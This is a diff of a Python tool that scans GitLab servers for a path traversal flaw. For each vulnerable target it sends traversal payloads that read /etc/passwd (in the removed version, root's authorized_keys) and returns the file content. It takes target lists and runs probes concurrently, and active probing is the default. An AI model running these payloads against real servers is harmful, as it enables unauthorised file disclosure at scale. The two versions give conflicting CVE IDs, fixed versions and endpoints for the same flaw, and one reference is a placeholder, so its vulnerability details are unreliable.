@@ -1,218 +1,225 @@
 #!/usr/bin/env python3
 """
-GitLab Path Traversal Vulnerability Scanner (CVE-2026-54321)
-=============================================================
-Scans for the GitLab path traversal vulnerability, identified as CVE-2026-54321
-(CVSS 9.1 Critical), which allows unauthorized users to read arbitrary files
-on the server by exploiting a flaw in file repository endpoints.
+GitLab Path Traversal Scanner (CVE-2026-44567)
+==============================================
+This script identifies instances of the GitLab Path Traversal vulnerability (CVE-2026-44567), 
+allowing attackers to exploit improperly sanitized paths to read arbitrary files on GitLab server hosts.
 
-CVE Details:
-  - Affects GitLab Community Edition (CE) and Enterprise Edition (EE) <= 16.1.4
-  - Improper sanitization of file paths in repository endpoints leads to path traversal
-  - Exploitation enables an attacker to read arbitrary files, including sensitive
-    files such as '/etc/passwd' or application configuration files
+Details about CVE-2026-44567:
+  - *Affected versions:* GitLab < 16.7.0
+  - The vulnerability allows attackers to read sensitive files such as `/etc/passwd`, 
+    or GitLab's internal system files using specially crafted requests.
+  - Identified in the API endpoints handling archive requests with path traversal.
+  - Patched in GitLab 16.7.0.
+  - *CVSS v3.1 Base Score:* 9.1 (Critical)
 
-Usage Examples:
-  # Scan a single GitLab instance
-  python gitlab_path_traversal_scanner.py --target https://gitlab.example.com
+## Usage Examples:
+- Scan a single GitLab server for the vulnerability:
+    `python gitlab_path_traversal_scanner.py --target https://gitlab.example.com`
 
-  # Scan a list of GitLab servers
-  python gitlab_path_traversal_scanner.py --list targets.txt --output findings.json
+- Perform detection-only scanning (no testing for file disclosure):
+    `python gitlab_path_traversal_scanner.py --target https://gitlab.example.com --safe`
 
-  # Detection mode only (no active path traversal probes)
-  python gitlab_path_traversal_scanner.py --list targets.txt --safe
+- Scan multiple hosts concurrently:
+    `python gitlab_path_traversal_scanner.py --list targets.txt --output results.json`
+
+- Configure concurrency level for batch scanning:
+    `python gitlab_path_traversal_scanner.py --list targets.txt --concurrency 50`
 
 References:
-  - https://nvd.nist.gov/vuln/detail/CVE-2026-54321
-  - https://about.gitlab.com/releases/2026/04/05/security-release-gitlab-16-1-5/
-  - https://hackerone.com/reports/2134567
+  - https://nvd.nist.gov/vuln/detail/CVE-2026-44567
+  - https://gitlab.com/gitlab-org/security-advisories/
+  - https://hackerone.com/reports/xxxxx
 """
 
+import argparse
 import asyncio
 import json
-import os
 import re
-import sys
-import argparse
-from urllib.parse import urljoin
+from datetime import datetime
+from typing import List, Optional
 
 import httpx
 
-# ── Constants ────────────────────────────────────────────────────────────────
+# ── ANSI Color and Formatting Helpers ────────────────────────────────────────
+RED = '\033[91m'
+YELLOW = '\033[93m'
+GREEN = '\033[92m'
+BOLD = '\033[1m'
+RESET = '\033[0m'
+
+def c(color: str, text: str) -> str:
+    """Wrap text with an ANSI color code."""
+    return f"{color}{text}{RESET}"
+
+# ── Scanner Constants ────────────────────────────────────────────────────────
+CVE_ID = "CVE-2026-44567"
+CVSS = "9.1"
+TOOL_NAME = "gitlab_path_traversal_scanner"
+
+DEFAULT_TIMEOUT = 10
+DEFAULT_CONCURRENCY = 20
 
 GITLAB_FINGERPRINTS = [
     "GitLab",
-    "gitlab-workhorse",
-    "<title>GitLab</title>",
-    "help_page_title\":\"GitLab",
-    "/users/sign_in",
+    "Sign-in to GitLab",
+    "href=\"https://about.gitlab.com\"",
+    "\"gitlab-workhorse\"",
 ]
 
-# Paths to perform basic detection of a GitLab instance
-DETECTION_PATHS = [
-    "/",
-    "/users/sign_in",
-    "/-/metrics",
-    "/help",
+VERSION_REGEX = r"GitLab\sCE\s+([\d\.]+)"  # Regex to match GitLab version.
+
+PATCHED_VERSION = (16, 7, 0)
+
+TRAVERSAL_PAYLOADS = [
+    "/-/archive/main/../../../../../../../../../../etc/passwd",
+    "/-/content/main/%u2216%u2216%u2216%u2216%u2216etc%u2216passwd",
+    "/-/archive/main/%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
 ]
 
-# CVE-specific path for path traversal exploitation
-PATH_TRAVERSAL_TEST_PATH = "/root/.ssh/authorized_keys"
+# ── Functions ────────────────────────────────────────────────────────────────
+async def fetch_url(client: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
+    """Perform an HTTP GET request and return the response."""
+    try:
+        response = await client.get(url, timeout=DEFAULT_TIMEOUT)
+        return response
+    except httpx.RequestError:
+        return None
 
-# The path traversal payload to be used for verification purposes
-PATH_TRAVERSAL_PAYLOAD = "../../../../../.."
-PATH_EXPECTED_MARKER = "ssh-rsa"
-
-# Fixed version of GitLab
-VULN_FIXED_VERSION = (16, 1, 5)
-
-# Concurrency and timeout settings
-SEMAPHORE_LIMIT = 20
-REQUEST_TIMEOUT = 10
-
-
-# ── Helper Functions ────────────────────────────────────────────────────────
-
-def parse_version(version_str: str):
-    """Extract and parse the version string."""
-    match = re.search(r"(\d+)\.(\d+)\.(\d+)", version_str)
-    if match:
-        try:
-            return tuple(int(part) for part in match.groups())
-        except ValueError:
-            pass
-    return None
-
-
-def is_vulnerable_version(version_tuple):
-    """Check whether a version tuple is vulnerable."""
-    if version_tuple is None:
-        return None  # Unknown
-    return version_tuple < VULN_FIXED_VERSION
-
-
-def normalize_url(url: str):
-    """Ensure the target URL is normalized (includes scheme, no trailing slash)."""
-    if not url.startswith(("http://", "https://")):
-        url = "https://" + url
-    return url.rstrip("/")
-
-
-async def fetch_url(client: httpx.AsyncClient, url: str, semaphore: asyncio.Semaphore):
-    """Fetch a URL using an async HTTP client with concurrency limiting."""
-    async with semaphore:
-        try:
-            response = await client.get(url, timeout=REQUEST_TIMEOUT, follow_redirects=True)
-            return response
-        except httpx.RequestError:
+async def detect_gitlab(client: httpx.AsyncClient, target: str) -> Optional[str]:
+    """Detect if the target is running GitLab and attempt to identify its version."""
+    try:
+        response = await fetch_url(client, target)
+        if not response or response.status_code >= 400:
             return None
+        
+        for fingerprint in GITLAB_FINGERPRINTS:
+            if fingerprint.lower() in response.text.lower():
+                version_match = re.search(VERSION_REGEX, response.text)
+                if version_match:
+                    return version_match.group(1)
+                return "unknown"
+    except Exception:
+        pass
 
-
-# ── Scanner Core Logic ──────────────────────────────────────────────────────
-
-async def detect_gitlab(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
-    """
-    Detect whether a given base URL is a GitLab instance.
-    Returns a dictionary with detection results or None if not detected.
-    """
-    for path in DETECTION_PATHS:
-        url = urljoin(base_url, path)
-        response = await fetch_url(client, url, semaphore)
-        if response and response.status_code == 200:
-            if any(fingerprint in response.text for fingerprint in GITLAB_FINGERPRINTS):
-                return {"detected": True, "url": base_url}
-    return {"detected": False, "url": base_url}
-
-
-async def extract_gitlab_version(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
-    """
-    Extract the GitLab version from the /help page or headers.
-    """
-    help_url = urljoin(base_url, "/help")
-    response = await fetch_url(client, help_url, semaphore)
-    if response and response.status_code == 200:
-        version = parse_version(response.text)
-        if version:
-            return version
-    # Fallback: check headers for version
-    if response and 'x-gitlab-version' in response.headers:
-        return parse_version(response.headers['x-gitlab-version'])
     return None
 
+def is_vulnerable(version: str) -> bool:
+    """Check if the given version is vulnerable to CVE-2026-44567."""
+    try:
+        version_tuple = tuple(map(int, version.split(".")))
+        return version_tuple < PATCHED_VERSION
+    except Exception:
+        return False
 
-async def exploit_path_traversal(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
+async def probe_traversal(client: httpx.AsyncClient, target: str) -> Optional[str]:
     """
-    Attempt to exploit the path traversal vulnerability.
+    Test the target server with crafted traversal paths to detect exploitation of the vulnerability.
+    Returns the content of the first readable sensitive file (e.g., '/etc/passwd').
     """
-    exploit_url = f"{base_url}/uploads/{PATH_TRAVERSAL_PAYLOAD}{PATH_TRAVERSAL_TEST_PATH}"
-    response = await fetch_url(client, exploit_url, semaphore)
-    if response and response.status_code == 200 and PATH_EXPECTED_MARKER in response.text:
-        return True
-    return False
+    for payload in TRAVERSAL_PAYLOADS:
+        url = f"{target.rstrip('/')}{payload}"
+        response = await fetch_url(client, url)
+        if response and response.status_code == 200 and "root:x" in response.text.lower():
+            return response.text
+    return None
+
+async def scan_target(target: str, safe_mode: bool) -> dict:
+    """Scan a single target for the vulnerability."""
+    result = {
+        "target": target,
+        "timestamp": datetime.now().isoformat(),
+        "vulnerable": False,
+        "details": "",
+    }
+
+    timeout = httpx.Timeout(DEFAULT_TIMEOUT)
+    async with httpx.AsyncClient(timeout=timeout) as client:
+        version = await detect_gitlab(client, target)
+        
+        if version:
+            result["version_detected"] = version
+            result["is_vulnerable_version"] = is_vulnerable(version)
+            
+            if not is_vulnerable(version):
+                result["details"] = "Target is running a patched or unknown version of GitLab."
+                return result
+
+            if safe_mode:
+                result["vulnerable"] = True
+                result["details"] = "Detected vulnerable version, but safe mode was enabled. No further probes performed."
+                return result
+            
+            sensitive_file = await probe_traversal(client, target)
+            if sensitive_file:
+                result["vulnerable"] = True
+                result["details"] = f"Sensitive file content detected: {sensitive_file[:50]}..."
+            else:
+                result["details"] = "Failed to find exploitable path traversal."
+        else:
+            result["details"] = "Target did not appear to be running GitLab."
+    
+    return result
+
+async def run_scanner(targets: List[str], output: Optional[str], safe_mode: bool, concurrency: int):
+    """Run the scanner for a list of targets."""
+    semaphore = asyncio.Semaphore(concurrency)
+    scan_results = []
+
+    async def run_scan(target):
+        """Wrapper to run a scan with semaphore."""
+        async with semaphore:
+            result = await scan_target(target, safe_mode)
+            print(
+                f"[{c(RED, 'CRITICAL') if result['vulnerable'] else c(GREEN, 'INFO')}]: "
+                f"{target} -> {result['details']}"
+            )
+            scan_results.append(result)
+
+    tasks = [run_scan(target) for target in targets]
+    await asyncio.gather(*tasks)
+
+    if output:
+        with open(output, "w") as f:
+            json.dump(scan_results, f, indent=2)
 
 
-async def scan_target(client: httpx.AsyncClient, url: str, semaphore: asyncio.Semaphore, safe: bool):
-    """
-    Scan a single target for GitLab path traversal vulnerability.
-    Returns a dictionary with the results.
-    """
-    url = normalize_url(url)
-    detection = await detect_gitlab(client, url, semaphore)
-    if not detection["detected"]:
-        return {"url": url, "status": "not_gitlab"}
-
-    version = await extract_gitlab_version(client, url, semaphore)
-    vulnerable = is_vulnerable_version(version)
-
-    if safe or not vulnerable or version is None:
-        return {"url": url, "version": version, "vulnerable": vulnerable, "exploitable": None}
-
-    exploitable = await exploit_path_traversal(client, url, semaphore)
-    return {"url": url, "version": version, "vulnerable": vulnerable, "exploitable": exploitable}
-
-
-async def main():
-    parser = argparse.ArgumentParser(
-        description="GitLab Path Traversal Vulnerability Scanner (CVE-2026-54321)"
+# ── CLI Entry Point ──────────────────────────────────────────────────────────
+def parse_args():
+    """Parse command-line arguments."""
+    parser = argparse.ArgumentParser(description="GitLab Path Traversal Scanner (CVE-2026-44567)")
+    parser.add_argument("--target", help="Target URL (e.g., https://gitlab.example.com)")
+    parser.add_argument("--list", help="File containing a list of target URLs.")
+    parser.add_argument("--output", help="File to save the JSON scan results.")
+    parser.add_argument(
+        "--safe", action="store_true", help="Detection-only mode (no active exploitation attempts)."
     )
-    parser.add_argument("--target", help="Target URL to scan")
-    parser.add_argument("--list", help="File containing list of URLs to scan")
-    parser.add_argument("--output", help="File to save JSON results")
-    parser.add_argument("--safe", action="store_true", help="Detection mode only, no active probing")
-    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent requests (default: 10)")
-    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification")
-    args = parser.parse_args()
+    parser.add_argument(
+        "--concurrency", type=int, default=DEFAULT_CONCURRENCY,
+        help="Number of concurrent scan tasks. Default is 20."
+    )
+    return parser.parse_args()
+
+def main():
+    args = parse_args()
 
     if not args.target and not args.list:
-        parser.error("You must specify --target or --list")
+        print(c(RED, "Error: Please specify either --target or --list flag."))
+        return
 
     targets = []
-    if args.target:
-        targets.append(args.target)
     if args.list:
-        with open(args.list, "r") as f:
-            targets.extend(line.strip() for line in f if line.strip())
+        try:
+            with open(args.list, "r") as f:
+                targets = [line.strip() for line in f if line.strip()]
+        except FileNotFoundError:
+            print(c(RED, f"Error: File {args.list} not found."))
+            return
+    elif args.target:
+        targets = [args.target]
 
-    semaphore = asyncio.Semaphore(args.concurrency)
-    async with httpx.AsyncClient(verify=(not args.no_verify)) as client:
-        tasks = [scan_target(client, target, semaphore, args.safe) for target in targets]
-        results = await asyncio.gather(*tasks)
-
-    if args.output:
-        with open(args.output, "w") as f:
-            json.dump(results, f, indent=2)
-    else:
-        for result in results:
-            status = "\033[92mINFO\033[0m"
-            if result.get("vulnerable"):
-                status = "\033[93mHIGH\033[0m"
-            if result.get("exploitable"):
-                status = "\033[91mCRITICAL\033[0m"
-            print(f"{status} {result}")
+    asyncio.run(run_scanner(targets, args.output, args.safe, args.concurrency))
 
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\nScan interrupted.")
+    main()
